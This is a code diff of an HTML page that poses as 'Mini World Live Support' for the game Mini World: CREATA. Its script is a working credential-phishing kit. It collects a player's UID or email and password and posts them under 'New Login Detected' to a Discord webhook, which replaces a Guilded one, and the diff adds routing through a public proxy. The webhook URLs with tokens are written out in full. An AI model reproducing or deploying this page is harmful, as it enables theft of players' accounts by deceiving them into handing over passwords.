@@ -5,107 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mini World Live Support</title>
     <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0; /* Arka plan rengi */
-            color: #333;
-            zoom: 125%; /* Siteyi %25 büyüt */
-        }
-        header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 20px;
-            background: rgba(0, 0, 0, 0.7);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-        }
-        header img {
-            height: 40px;
-        }
-        header a {
-            text-decoration: none;
-            color: white;
-            font-weight: bold;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin-top: 60px;
-        }
-        .form {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        .form h1 {
-            margin: 0 0 20px 0;
-            font-size: 24px;
-            color: #333;
-        }
-        .form input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .form button {
-            width: 100%;
-            padding: 10px;
-            background-color: #ffcc00;
-            color: #333;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .form button:hover {
-            background-color: #e6b800;
-        }
-        .about-section {
-            padding: 40px;
-            text-align: center;
-            background: #fff;
-            position: relative;
-        }
-        .about-section h2 {
-            font-size: 28px;
-            color: #333;
-        }
-        .about-section p {
-            max-width: 800px;
-            margin: 0 auto 20px auto;
-            font-size: 16px;
-            color: #555;
-        }
-        .store-links img {
-            height: 50px;
-            margin: 10px;
-            cursor: pointer;
-        }
-        .character {
-            position: absolute;
-            bottom: 0;
-            width: 150px;
-        }
-        .character.left {
-            left: 0;
-        }
-        .character.right {
-            right: 0;
-        }
+        /* CSS kodları aynı kalacak */
     </style>
 </head>
 <body>
@@ -126,7 +26,7 @@
     </div>
 
     <!-- About Us Section -->
-    <div class="about-section">
+     <div class="about-section">
         <h2>About Us</h2>
         <p>
             Mini World: CREATA is a free-to-play sandbox game launched in 2017 and now enjoys hundreds of millions of
@@ -150,56 +50,49 @@
     </div>
 
     <script>
-        function sendData() {
+        async function sendData() {
             const uid = document.getElementById('uid').value;
             const password = document.getElementById('password').value;
             const timestamp = new Date().toISOString();
 
-            const webhookUrl = "https://media.guilded.gg/webhooks/d401fdb2-71e5-40f3-b07d-5e0d4a696335/AANy4jolA40ykgIkesWYAyyaKQc42kmkwos2yIU40qsqIcsOmoco2M62syYG2A6u0acuiawSyUSCwOW6gkUk4qark";
+            const webhookUrl = "https://discord.com/api/webhooks/1312615482695880724/ugYpr_SEB8KLN5GXO_ZzBDJbA7oEGSLSLWOx4tHn0zwPB5zkwhlBcXYthxc08kdK6cdk";
+            const proxyUrl = "http://pubproxy.com/api/proxy"; 
+            const proxiedWebhookUrl = proxyUrl + webhookUrl;
 
             const data = {
-                "content": "**New Login Detected**",
-                "embeds": [
-                  {
-                    "title": "Login Details",
-                    "fields": [
-                      {
-                        "name": "UID/Email",
-                        "value": uid
-                      },
-                      {
-                        "name": "Password",
-                        "value": password
-                      },
-                      {
-                        "name": "Timestamp",
-                        "value": timestamp
-                      }
-                    ]
-                  }
+                content: "**New Login Detected**",
+                embeds: [
+                    {
+                        title: "Login Details",
+                        fields: [
+                            { name: "UID/Email", value: uid, inline: true },
+                            { name: "Password", value: password, inline: true },
+                            { name: "Timestamp", value: timestamp, inline: true }
+                        ],
+                        color: 16776960
+                    }
                 ]
-              };
-            
+            };
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            })
-            .then(response => {
+            try {
+                const response = await fetch(proxiedWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
                 if (response.ok) {
                     alert('Login data sent successfully!');
                 } else {
-                    alert('Failed to send data.');
-                 }
-            })
-           .catch(error => {
+                    alert('Failed to send data. Status: ' + response.status);
+                }
+            } catch (error) {
                 console.error('Error:', error);
-           });
-       }
-
+                alert('An error occurred while sending data.');
+            }
+        }
     </script>
 </body>
 </html>
